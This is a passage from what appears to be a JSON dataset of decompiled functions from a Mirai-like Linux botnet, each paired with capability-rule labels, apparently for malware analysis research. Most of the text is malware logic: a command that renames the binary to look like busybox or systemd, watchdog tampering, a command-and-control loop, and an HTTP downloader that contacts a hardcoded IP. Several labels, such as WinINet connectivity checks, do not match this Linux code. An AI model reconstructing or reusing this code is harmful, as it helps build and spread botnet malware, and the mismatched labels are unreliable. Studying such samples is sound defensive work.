if (0 < *0x50f510 || uVar4 == 0) {\n        return uVar4 & 0xffffff00 | uVar4 == 0;\n    }\n    uStack12 = 1;\n    fcn.004061e0(9);\n    fcn.004061e0(10);\n    fcn.004061e0(0xb);\n    fcn.004061e0(0xc);\n    fcn.004061e0(0xd);\n    fcn.004061e0(0xe);\n    fcn.004061e0(0xf);\n    fcn.004061e0(0x10);\n    fcn.004061e0(0x11);\n    fcn.004061e0(0x12);\n    auVar12 = fcn.00406140(9, 0);\n    uVar4 = fcn.00406a5c(SUB168(auVar12, 0), 2, SUB168(auVar12 >> 0x40, 0));\n    if (uVar4 == 0xffffffff) {\n        auVar12 = fcn.00406140(10, 0);\n        uVar4 = fcn.00406a5c(SUB168(auVar12, 0), 2, SUB168(auVar12 >> 0x40, 0));\n        if (uVar4 == 0xffffffff) {\n            auVar12 = fcn.00406140(0xb, 0);\n            uVar4 = fcn.00406a5c(SUB168(auVar12, 0), 2, SUB168(auVar12 >> 0x40, 0));\n            if (uVar4 == 0xffffffff) {\n                auVar12 = fcn.00406140(0xc, 0);\n                uVar4 = fcn.00406a5c(SUB168(auVar12, 0), 2, SUB168(auVar12 >> 0x40, 0));\n                if (uVar4 == 0xffffffff) {\n                    auVar12 = fcn.00406140(0xd, 0);\n                    uVar4 = fcn.00406a5c(SUB168(auVar12, 0), 2, SUB168(auVar12 >> 0x40, 0));\n                    if (uVar4 == 0xffffffff) {\n                        auVar12 = fcn.00406140(0xe, 0);\n                        uVar4 = fcn.00406a5c(SUB168(auVar12, 0), 2, SUB168(auVar12 >> 0x40, 0));\n                        if (uVar4 == 0xffffffff) {\n                            auVar12 = fcn.00406140(0xf, 0);\n                            uVar4 = fcn.00406a5c(SUB168(auVar12, 0), 2, SUB168(auVar12 >> 0x40, 0));\n                            if (uVar4 == 0xffffffff) {\n                                auVar12 = fcn.00406140(0x10, 0);\n                                uVar4 = fcn.00406a5c(SUB168(auVar12, 0), 2, SUB168(auVar12 >> 0x40, 0));\n                                if (uVar4 == 0xffffffff) {\n                                    auVar12 = fcn.00406140(0x11, 0);\n                                    uVar4 = fcn.00406a5c(SUB168(auVar12, 0), 2, SUB168(auVar12 >> 0x40, 0));\n                                    if (uVar4 == 0xffffffff) {\n                                        auVar12 = fcn.00406140(0x12, 0);\n                                        puVar11 = 0x2;\n                                        uVar4 = fcn.00406a5c(SUB168(auVar12, 0), 2, SUB168(auVar12 >> 0x40, 0));\n                                        uStack72 = uVar4;\n                                        if (uVar4 == 0xffffffff) {\n                                            fcn.00406170(9);\n                                            fcn.00406170(10);\n                                            fcn.00406170(0xb);\n                                            fcn.00406170(0xc);\n                                            fcn.00406170(0xd);\n                                            fcn.00406170(0xe);\n                                            fcn.00406170(0xf);\n                                            fcn.00406170(0x10);\n                                            fcn.00406170(0x11);\n                                            fcn.00406170();\n                                            iVar5 = 0;\n                                            fcn.0040a1b8(0);\n                                            *0x50f50c = 0;\n                                            *0x5115c8 = 1;\n                                            fcn.00404430();\n                                            *0x5115c0 = fcn.00405dd0();\n                                            fcn.00406250();\n                                            *0x50f060 = 0x404740;\n                                            fcn.004055f0();\n                                            fcn.00405db0(0x5115e0, 0x20);\n                                            if ((iVar5 == 2) && (iVar5 = fcn.00405cf0(puVar11[1]),  iVar5 < 0x20)) {\n                                                fcn.00405d50(0x5115e0, puVar11[1]);\n                                                uVar4 = fcn.00405cf0(puVar11[1]);\n                                                fcn.00405db0(puVar11[1], uVar4);\n                                            }\n                                            else {\n                                                fcn.00405d50(0x5115e0, 0x40dbf1);\n                                            }\n                                            apcStack224[0] = \"/bin/busybox\";\n                                            apcStack224[1] = \"/bin/watchdog\";\n                                            apcStack224[2] = \"/bin/systemd\";\n                                            apcStack256[0] = \"bin/busybox\";\n                                            apcStack256[1] = \"bin/watchdog\";\n                                            apcStack256[2] = \"bin/systemd\";\n                                            apcStack192[0] = \"zxcr9999\";\n                                            apcStack192[1] = \"zxcr9999\";\n                                            apcStack192[2] = \"zxcr9999\";\n                                            uVar4 = fcn.004055a0();\n                                            uVar8 = uVar4;\n                                            uVar4 = uVar4 % 3;\n                                            fcn.00405d50(auStack432, \"rm -rf \");\n                                            pcVar2 = apcStack256[uVar4];\n                                            fcn.00405d20(auStack432, pcVar2);\n                                            fcn.00405d20(auStack432, \" && mkdir \");\n                                            fcn.00405d20(auStack432, apcStack192[uVar4]);\n                                            fcn.00405d20(auStack432, 0x40cd15);\n                                            fcn.00405d20(auStack432, pcVar2);\n                                            fcn.00405d20(auStack432, \" &&  mv \");\n                                            fcn.00405d20(auStack432, *puVar11);\n                                            fcn.00405d20(auStack432, \" \");\n                                            fcn.00405d20(auStack432, pcVar2);\n                                            fcn.00405d20(auStack432, \"; chmod 777 \");\n                                            fcn.00405d20(auStack432, pcVar2);\n                                            fcn.00409edc(auStack432);\n                                            pcVar2 = apcStack224[uVar4];\n                                            fcn.00405d50(*puVar11, pcVar2);\n                                            fcn.00406ad4(0xf, pcVar2, noname_2, uVar8);\n                                            fcn.004061e0(2);\n                                            fcn.00406140(2, auStack92);\n                                            fcn.00406c1c(1);\n                                            fcn.00406c1c(1);\n                                            fcn.00406170();\n                                            iVar5 = fcn.00406950();\n                                            if (0 < iVar5) {\n                                                return 0;\n                                            }\n                                            *0x50f518 = fcn.00406b7c();\n                                            fcn.00406924(0);\n                                            iVar5 = 0;\n                                            fcn.00406924(1);\n                                            fcn.00406924(2);\n                                            fcn.00400740();\n                                            fcn.00404460();\n                                            fcn.00403870();\n                                            fcn.004047d0();\ncode_r0x00404d35:\n                                            while( true ) {\n                                                do {\n                                                    auStack688[0] = 0;\n                                                    auStack688[1] = 0;\n                                                    auStack688[2] = 0;\n                                                    auStack688[3] = 0;\n                                                    uStack656 = 0;\n                                                    uStack648 = 0;\n                                                    uStack640 = 0;\n                                                    uStack632 = 0;\n                                                    uStack624 = 0;\n                                                    uStack616 = 0;\n                                                    uStack608 = 0;\n                                                    uStack600 = 0;\n                                                    uStack592 = 0;\n                                                    uStack584 = 0;\n                                                    uStack576 = 0;\n                                                    uStack568 = 0;\n                                                    auStack560[0] = 0;\n                                                    auStack560[1] = 0;\n                                                    auStack560[2] = 0;\n                                                    auStack560[3] = 0;\n                                                    uStack528 = 0;\n                                                    uStack520 = 0;\n                                                    uStack512 = 0;\n                                                    uStack504 = 0;\n                                                    uStack496 = 0;\n                                                    uStack488 = 0;\n                                                    uStack480 = 0;\n                                                    uStack472 = 0;\n                                                    uStack464 = 0;\n                                                    uStack456 = 0;\n                                                    uStack448 = 0;\n                                                    uStack440 = 0;\n                                                    if (*0x50f058 != 0xffffffff) {\n                                                        auStack688[*0x50f058 >> 6] =\n                                                             auStack688[*0x50f058 >> 6] | 1 << (*0x50f058 & 0x3f);\n                                                    }\n                                                    if ((*0x50f05c == 0xffffffff) &&\n                                                       (*0x50f05c = fcn.00408898(2, 1, 0),  *0x50f05c != 0xffffffff)) {\n                                                        uVar4 = fcn.00406894(*0x50f05c, 3, 0);\n                                                        fcn.00406894(*0x50f05c, 4, uVar4 | 0x800);\n                                                        if (*0x50f060 != NULL) {\n                                                            (**0x50f060)();\n                                                        }\n                                                        *0x50f514 = '\\x01';\n                                                        fcn.00408730(*0x50f05c, 0x511620, 0x10);\n                                                    }\n                                                    if (*0x50f514 == '\\0') {\n                                                        auStack688[*0x50f05c >> 6] =\n                                                             auStack688[*0x50f05c >> 6] | 1 << (*0x50f05c & 0x3f);\n                                                    }\n                                                    else {\n                                                        auStack560[*0x50f05c >> 6] =\n                                                             auStack560[*0x50f05c >> 6] | 1 << (*0x50f05c & 0x3f);\n                                                    }\n                                                    uVar4 = *0x50f05c;\n                                                    if (*0x50f05c <= *0x50f058) {\n                                                        uVar4 = *0x50f058;\n                                                    }\n                                                    uStack120 = 0;\n                                                    uStack128 = 10;\n                                                    puVar11 = &uStack128;\n                                                    iVar6 = fcn.00406b50(uVar4 + 1, auStack688, auStack560, 0);\n                                                } while (iVar6 == -1);\n                                                if (iVar6 == 0) {\n                                                    auStack82[0] = 0;\n                                                    iVar10 = iVar5 + 1;\n                                                    iVar6 = iVar5 % 6;\n                                                    iVar5 = iVar10;\n                                                    if (iVar6 == 0) {\n                                                        fcn.00408824(*0x50f05c, auStack82, 2, 0x4000);\n                                                    }\n                                                }\n                                                if (((*0x50f504 == 0) && (*0x50f058 != 0xffffffff)) &&\n                                                   ((auStack688[*0x50f058 >> 6] >> (*0x50f058 & 0x3f) & 1) != 0)) {\n                                                    iStack88 = 0x10;\n                                                    fcn.004086d8(*0x50f058);\n                                                    fcn.00404160();\n                                                    fcn.00403860();\n                                                    fcn.004002b0();\n                                                    fcn.00406a30(-*0x50f518, 9);\n                                                    uVar4 = *0x50f510;\n                                                    if (*0x50f510 != 0) goto code_r0x004054f0;\n                                                    goto code_r0x004053d5;\n                                                }\n                                                if (*0x50f514 == '\\0') goto code_r0x00405067;\n                                                uVar8 = *0x50f05c;\n                                                *0x50f514 = '\\0';\n                                                if ((auStack560[*0x50f05c >> 6] >> (*0x50f05c & 0x3f) & 1) == 0) break;\n                                                iStack88 = 0;\n                                                uStack96 = 4;\n                                                fcn.00408788(uVar8, 1, 4, &iStack88);\n                                                if (iStack88 != 0) goto code_r0x004051d8;\n                                                *0x5115c0 = fcn.00405dd0();\n                                                uVar3 = fcn.00405cf0(0x5115e0);\n                                                auStack82[0] = auStack82[0] & 0xff00 | uVar3;\n                                                fcn.00405db0(auStack320, 0x40);\n                                                fcn.00405d90(auStack320, 0x40cd2f, 3);\n                                                fcn.00405d90(&uStack317, auStack82, 2);\n                                                fcn.00405d90(auStack316, 0x5115e0, auStack82[0]);\n                                                fcn.00408824(*0x50f05c, auStack320, auStack82[0] + 4, 0x4000);\n                                                fcn.00405db0(auStack320, 0x40);\n                                            }\n                                            goto code_r0x00404ffd;\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    fcn.004069c8(uVar4, 0x80045704, &uStack12);\n    do {\n        fcn.004069c8(uVar4, 0x80045705, 0);\n        fcn.0040a334(10);\n    } while( true );\ncode_r0x00405067:\n    if ((*0x50f05c == 0xffffffff) || ((auStack688[*0x50f05c >> 6] >> (*0x50f05c & 0x3f) & 1) == 0))\n    goto code_r0x00404d35;\n    piVar7 = fcn.00406f98();\n    *piVar7 = 0;\n    arg4 = 0x4000;\n    uVar4 = fcn.004087e8(*0x50f05c, &cStack1712, 0x400, 0x4000);\n    if (uVar4 < 1) {\n        if (*piVar7 != 0xb && *piVar7 != 4) {\ncode_r0x004051d8:\n            uVar8 = *0x50f05c;\ncode_r0x00404ffd:\n            if (uVar8 != -1) {\n                fcn.00406924(uVar8);\n            }\n            *0x50f05c = 0xffffffff;\n            uVar4 = fcn.004055a0();\n            fcn.0040a334(uVar4 % 10 + 1);\n        }\n        goto code_r0x00404d35;\n    }\n    if (cStack1712 == -0x67) {\n        if (cStack1711 == 'f') {\n            if (cStack1710 == '3') {\n                uVar3 = fcn.00405cf0(\"ping\");\n                auStack82[0] = auStack82[0] & 0xff00 | uVar3;\n                fcn.00405db0(auStack320, 0x40);\n                fcn.00405d90(auStack320, 0x40cd33, 3);\n                fcn.00405d90(&uStack317, auStack82, 2);\n                fcn.00405d90(auStack316, \"ping\", auStack82[0]);\n                fcn.00408824(*0x50f05c, auStack320, auStack82[0] + 4, 0x4000);\n                fcn.00405db0(&cStack1712, 0x400);\n                goto code_r0x00404d35;\n            }\n            if (cStack1710 != 'f') goto code_r0x004050e7;\n            if (*0x50f500 == 0) {\n                *0x50f500 = 1;\n                goto code_r0x00404d35;\n            }\n            *0x50f504 = 1;\n            fcn.00406924(*0x50f058);\n            fcn.00406924(*0x50f05c);\n            uVar4 = -*0x50f518;\ncode_r0x004054f0:\n            fcn.00406a30(uVar4, 9);\ncode_r0x004053d5:\n            fcn.0040a1b8(0);\ncode_r0x004053dc:\n            if (*0x50f50c != 1) goto code_r0x004050e7;\n            fcn.00407094(auStack160, \"CoNdInEt %s:%d\", \"webserv\", *0x50f508, puVar11, in_R9);\n            uVar3 = fcn.00405cf0(auStack160);\n            auStack82[0] = auStack82[0] & 0xff00 | uVar3;\n            fcn.00405db0(auStack320, 0x40);\n            fcn.00405d90(auStack320, 0x40cd33, 3);\n            fcn.00405d90(&uStack317, auStack82, 2);\n            fcn.00405d90(auStack316, auStack160, auStack82[0]);\n            arg4 = 0x4000;\n            fcn.00408824(*0x50f05c, auStack320, auStack82[0] + 4, 0x4000);\n            fcn.00405db0(auStack320, 0x40);\n            noname_2_00 = extraout_RDX_00;\ncode_r0x004052f6:\n            if (cStack1710 == '3') {\n                if (*0x50f50c != 1) goto code_r0x004050e7;\n                iVar9 = 0;\n                do {\n                    iVar1 = iVar9 * 8;\n                    iVar9 = iVar9 + 1;\n                    fcn.00405e50(*(iVar1 + 0x40cd60), 0, noname_2_00, arg4);\n                    noname_2_00 = extraout_RDX_01;\n                } while (iVar9 != 8);\n            }\n            if ((cStack1710 == 'f') && (*0x50f50c != 1)) {\n                uVar4 = fcn.004055a0();\n                *0x50f508 = uVar4 % 0xfbff + 0x400;\n                fcn.00403680(*0x50f508);\n                *0x50f50c = 1;\n            }\n            goto code_r0x004050e7;\n        }\n    }\n    else if (cStack1712 == '3') {\n        if (cStack1711 == 'f') {\n            noname_2_00 = extraout_RDX;\n            if (cStack1710 == -0x67) goto code_r0x004053dc;\n            goto code_r0x004052f6;\n        }\n    }\n    else if ((cStack1712 == 'f') && (cStack1711 == 'f')) {\n        if (cStack1710 == -0x67) {\n            *0x5115c8 = 1;\n        }\n        goto code_r0x004050e7;\n    }\n    fcn.00400410(&cStack1712, uVar4);\ncode_r0x004050e7:\n    fcn.00405db0(&cStack1712, 0x400);\n    goto code_r0x00404d35;\n}\n",
        "token_count": 5249
    },
    "00405690": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00405690(uint32_t *arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *0x50f51c;\n    if (0 < arg2) {\n        do {\n            *0x50f51c = *0x50f520;\n            *0x50f520 = *0x50f524;\n            *0x50f524 = *0x50f528;\n            if (arg2 < 4) {\n                if (arg2 == 1) {\n                    uVar1 = uVar1 << 0xb ^ uVar1;\n                    *0x50f528 = uVar1 >> 8 ^ uVar1 ^ *0x50f524 >> 0x13 ^ *0x50f524;\n                    *arg1 = *0x50f528;\n                    return;\n                }\n                arg2._0_4_ = arg2 + -2;\n                uVar1 = uVar1 << 0xb ^ uVar1;\n                *0x50f528 = uVar1 >> 8 ^ uVar1 ^ *0x50f524 >> 0x13 ^ *0x50f524;\n                *arg1 = *0x50f528;\n                arg1 = arg1 + 2;\n            }\n            else {\n                arg2._0_4_ = arg2 + -4;\n                uVar1 = uVar1 << 0xb ^ uVar1;\n                *0x50f528 = uVar1 >> 8 ^ uVar1 ^ *0x50f524 >> 0x13 ^ *0x50f524;\n                *arg1 = *0x50f528;\n                arg1 = arg1 + 1;\n            }\n            uVar1 = *0x50f51c;\n        } while (0 < arg2);\n    }\n    return;\n}\n",
        "token_count": 411
    },
    "004057a0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint8_t * fcn.004057a0(char *arg1)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    ushort *puVar8;\n    int64_t iVar9;\n    uint8_t uVar10;\n    uint8_t *puVar11;\n    uint16_t uVar12;\n    uint8_t *puVar13;\n    int16_t *piVar14;\n    int16_t iVar15;\n    ushort *puVar16;\n    char cVar17;\n    uint16_t uVar18;\n    int32_t iVar19;\n    ushort *arg1_00;\n    uint8_t *puStack4344;\n    int16_t aiStack4328 [6];\n    ushort auStack4316 [2];\n    uint8_t auStack4311 [2031];\n    int16_t iStack2280;\n    ushort uStack2278;\n    ushort uStack2276;\n    uchar uStack2268;\n    ushort auStack2267 [1017];\n    uint64_t auStack232 [4];\n    ulong uStack200;\n    ulong uStack192;\n    ulong uStack184;\n    ulong uStack176;\n    ulong uStack168;\n    ulong uStack160;\n    ulong uStack152;\n    ulong uStack144;\n    ulong uStack136;\n    ulong uStack128;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    uint uStack72;\n    \n    puStack4344 = fcn.00409190(1, 0x10);\n    arg1_00 = &uStack2268;\n    iVar3 = fcn.00405cf0(arg1);\n    puVar8 = auStack2267;\n    cVar17 = '\\0';\n    puVar16 = arg1_00;\n    for (iVar3 = iVar3 + 1; 0 < iVar3; iVar3 = iVar3 + -1) {\n        cVar2 = *arg1;\n        if (cVar2 == '.' || cVar2 == '\\0') {\n            *puVar16 = cVar17;\n            cVar17 = '\\0';\n            puVar16 = puVar8;\n        }\n        else {\n            cVar17 = cVar17 + '\\x01';\n            *puVar8 = cVar2;\n        }\n        puVar8 = puVar8 + 1;\n        arg1 = arg1 + 1;\n    }\n    *puVar8 = '\\0';\n    iVar19 = 1;\n    iVar3 = fcn.00405cf0(arg1_00);\n    uStack88 = 0;\n    uStack80 = 0;\n    iVar4 = fcn.00405cf0(arg1_00);\n    uVar5 = fcn.004055a0();\n    iVar15 = uVar5 + uVar5 / 0xffff;\n    fcn.00405db0(&uStack88, 0x10);\n    uStack2278 = 1;\n    uStack2276 = 0x100;\n    uStack88 = 0x808080835000002;\n    *(auStack2267 + iVar3) = 0x100;\n    *(auStack2267 + iVar3 + 2) = 0x100;\n    iStack2280 = iVar15;\ncode_r0x004058ff:\n    uVar5 = fcn.00408898(2, 2, 0);\n    if (((uVar5 == 0xffffffff) || (iVar3 = fcn.00408730(uVar5, &uStack88, 0x10),  iVar3 == -1)) ||\n       (iVar9 = fcn.00408824(uVar5, &iStack2280, iVar4 + 0x11, 0x4000),  iVar9 == -1)) {\n        fcn.0040a334(1);\n    }\n    else {\n        uVar6 = fcn.00406894(3, uVar5, 0);\n        uVar10 = uVar5 & 0x3f;\n        fcn.00406894(4, uVar5, uVar6 | 0x800);\n        auStack232[0] = 0;\n        auStack232[1] = 0;\n        auStack232[2] = 0;\n        auStack232[3] = 0;\n        uStack200 = 0;\n        uStack192 = 0;\n        uStack184 = 0;\n        uStack176 = 0;\n        uStack168 = 0;\n        uStack160 = 0;\n        uStack152 = 0;\n        uStack144 = 0;\n        uStack136 = 0;\n        uStack128 = 0;\n        uStack120 = 0;\n        uStack112 = 0;\n        uStack104 = 5;\n        auStack232[uVar5 >> 6] = auStack232[uVar5 >> 6] | 1 << uVar10;\n        uStack96 = 0;\n        iVar3 = fcn.00406b50(uVar5 + 1, auStack232, 0, 0);\n        if (iVar3 == -1) goto code_r0x00405b05;\n        if (iVar3 != 0) {\n            if ((auStack232[uVar5 >> 6] >> uVar10 & 1U) == 0) goto code_r0x00405b05;\n            iVar3 = fcn.004087f4(uVar5, aiStack4328, 0x800, 0x4000);\n            iVar7 = fcn.00405cf0(arg1_00);\n            if (iVar7 + 0x11U <= iVar3) {\n                arg1_00 = auStack4316;\n                iVar3 = fcn.00405cf0(arg1_00);\n                puVar11 = auStack4311 + iVar3;\n                if ((iVar15 == aiStack4328[0]) && (aiStack4328[3] != 0)) {\n                    uVar18 = aiStack4328[3] >> 8 | aiStack4328[3] << 8;\n                    while (uVar18 = uVar18 - 1,  uVar18 != 0xffff) {\n                        iVar4 = 1;\n                        iVar3 = 0;\n                        for (puVar13 = puVar11; uVar10 = *puVar13,  iVar19 = iVar3,  uVar10 != 0; puVar13 = puVar13 + 1)\n                        {\n                            while (0xbf < uVar10) {\n                                iVar19 = 1;\n                                iVar3 = 1;\n                                puVar13 = aiStack4328 + uVar10 * 0x100 + -0xc000 + puVar13[1];\n                                uVar10 = *puVar13;\n                                if (uVar10 == 0) goto code_r0x00405bb1;\n                            }\n                            iVar4 = iVar4 + (iVar19 == 0);\n                            iVar3 = iVar19;\n                        }\ncode_r0x00405bb1:\n                        piVar14 = puVar11 + (iVar4 + iVar3);\n                        piVar1 = piVar14 + 5;\n                        if ((*piVar14 == 0x100) && (piVar14[1] == 0x100)) {\n                            uVar12 = piVar14[4];\n                            if ((uVar12 >> 8 | uVar12 << 8) == 4) {\n                                uStack72 = *(piVar14 + 5);\n                                iVar9 = fcn.00409288(*(puStack4344 + 8), *puStack4344 + 1 << 2);\n                                uVar10 = *puStack4344;\n                                *(puStack4344 + 8) = iVar9;\n                                *(iVar9 + uVar10 * 4) = uStack72;\n                                *puStack4344 = uVar10 + 1;\n                                uVar12 = piVar14[4];\n                            }\n                            puVar11 = piVar1 + (uVar12 >> 8 | uVar12 << 8);\n                        }\n                        else {\n                            iVar4 = 1;\n                            iVar3 = 0;\n                            for (piVar14 = piVar1; uVar10 = *piVar14,  iVar19 = iVar3,  uVar10 != 0;\n                                piVar14 = piVar14 + 1) {\n                                while (0xbf < uVar10) {\n                                    iVar19 = 1;\n                                    iVar3 = 1;\n                                    piVar14 = aiStack4328 + uVar10 * 0x100 + -0xc000 + *(piVar14 + 1);\n                                    uVar10 = *piVar14;\n                                    if (uVar10 == 0) goto code_r0x00405c03;\n                                }\n                                iVar4 = iVar4 + (iVar19 == 0);\n                                iVar3 = iVar19;\n                            }\ncode_r0x00405c03:\n                            puVar11 = piVar1 + iVar4 + iVar3;\n                        }\n                    }\ncode_r0x00405b05:\n                    fcn.00406924(uVar5);\n                    if (*puStack4344 == 0) {\n                        if (*(puStack4344 + 8) != 0) {\n                            fcn.00409817(*(puStack4344 + 8));\n                        }\n                        fcn.00409817(puStack4344);\n                        puStack4344 = NULL;\n                    }\n                    return puStack4344;\n                }\n            }\n        }\n    }\n    if (iVar19 == 5) goto code_r0x00405b05;\n    iVar19 = iVar19 + 1;\n    if (uVar5 != 0xffffffff) {\n        fcn.00406924(uVar5);\n    }\n    goto code_r0x004058ff;\n}\n",
        "token_count": 2195
    },
    "00405cf0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00405cf0(char *arg1)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = arg1;\n    iVar2 = 0;\n    if (*arg1 != '\\0') {\n        do {\n            pcVar1 = arg1 + 1;\n            arg1 = arg1 + 1;\n        } while (*pcVar1 != '\\0');\n        iVar2 = arg1 - iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 116
    },
    "00405d20": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00405d20(char *arg1, char *arg2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    \n    for (; *arg1 != '\\0'; arg1 = arg1 + 1) {\n    }\n    cVar2 = *arg2;\n    while (cVar2 != '\\0') {\n        *arg1 = cVar2;\n        pcVar1 = arg2 + 1;\n        arg1 = arg1 + 1;\n        arg2 = arg2 + 1;\n        cVar2 = *pcVar1;\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "00405d50": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00405d50(char *arg1, char *arg2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    \n    pcVar5 = arg2;\n    if (*arg2 == '\\0') {\n        iVar3 = 0;\n        iVar4 = 0;\n    }\n    else {\n        do {\n            pcVar1 = pcVar5 + 1;\n            pcVar5 = pcVar5 + 1;\n        } while (*pcVar1 != '\\0');\n        iVar3 = pcVar5 - arg2;\n        iVar4 = iVar3;\n        if (iVar3 == -1) {\n            return -1;\n        }\n    }\n    do {\n        cVar2 = *arg2;\n        iVar4 = iVar4 + -1;\n        arg2 = arg2 + 1;\n        *arg1 = cVar2;\n        arg1 = arg1 + 1;\n    } while (iVar4 != -1);\n    return iVar3;\n}\n",
        "token_count": 236
    },
    "00405e50": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00405e50(ulong arg1, ulong noname_1, ulong noname_2, ulong arg4)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    char *pcVar7;\n    uint32_t uVar8;\n    uint64_t arg1_00;\n    ulong in_R8;\n    ulong in_R9;\n    char cStack136;\n    char acStack135 [63];\n    ushort uStack72;\n    ushort uStack70;\n    uint uStack68;\n    char cStack41;\n    \n    fcn.00407094(&cStack136, \"GET /%s HTTP/1.0\\r\\nUser-Agent: Update v1.0\\r\\n\\r\\n\", arg1, arg4, in_R8, in_R9);\n    fcn.00406fd0(arg1);\n    uVar3 = fcn.00408898(2, 1, 0);\n    arg1_00 = uVar3;\n    uStack68 = 0xc85cdd25;\n    uStack72 = 2;\n    uStack70 = 0x5000;\n    iVar4 = fcn.00408730(uVar3, &uStack72, 0x10);\n    if (-1 < iVar4) {\n        uVar3 = fcn.00406a5c(arg1, 0x241, 0x1ff);\n        pcVar7 = &cStack136;\n        cVar2 = cStack136;\n        if (uVar3 == 0xffffffff) {\n            fcn.00406924(arg1_00);\n            cVar2 = cStack136;\n        }\n        while (cVar2 != '\\0') {\n            pcVar1 = pcVar7 + 1;\n            pcVar7 = pcVar7 + 1;\n            cVar2 = *pcVar1;\n        }\n        iVar5 = fcn.00406c1c(arg1_00);\n        iVar6 = 0;\n        pcVar7 = &cStack136;\n        if (cStack136 != '\\0') {\n            do {\n                pcVar1 = pcVar7 + 1;\n                pcVar7 = pcVar7 + 1;\n            } while (*pcVar1 != '\\0');\n            iVar6 = pcVar7 - &cStack136;\n        }\n        if (iVar6 == iVar5) {\n            uVar8 = 0;\n            while (iVar4 = fcn.00406b00(arg1_00),  iVar4 == 1) {\n                uVar8 = uVar8 << 8 | cStack41;\n                if (uVar8 == 0xd0a0d0a) {\n                    while (iVar4 = fcn.00406b00(arg1_00),  0 < iVar4) {\n                        fcn.00406c1c(uVar3);\n                    }\n                    fcn.00406924(uVar3);\n                    fcn.00406924(arg1_00);\n                    return;\n                }\n            }\n        }\n        fcn.00406924(arg1_00);\n        fcn.00406924(uVar3);\n    }\n    return;\n}\n",
        "token_count": 711
    },
    "00406170": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00406170(uint8_t param_1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    uVar3 = *0x50f068;\n    iVar5 = param_1 * 0x10;\n    piVar1 = iVar5 + 0x511640;\n    if (*(iVar5 + 0x511648) != 0) {\n        iVar4 = 0;\n        do {\n            iVar2 = iVar4;\n            *(iVar4 + *piVar1) = *(iVar4 + *piVar1) ^ uVar3;\n            *(iVar4 + *piVar1) = *(iVar4 + *piVar1) ^ uVar3 >> 8;\n            *(iVar4 + *piVar1) = *(iVar4 + *piVar1) ^ uVar3 >> 0x10;\n            *(iVar4 + *piVar1) = *(iVar4 + *piVar1) ^ uVar3 >> 0x18;\n            iVar4 = iVar4 + 1;\n        } while (iVar2 + 1 < *(iVar5 + 0x511648));\n    }\n    return;\n}\n",
        "token_count": 275
    },
    "004061e0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
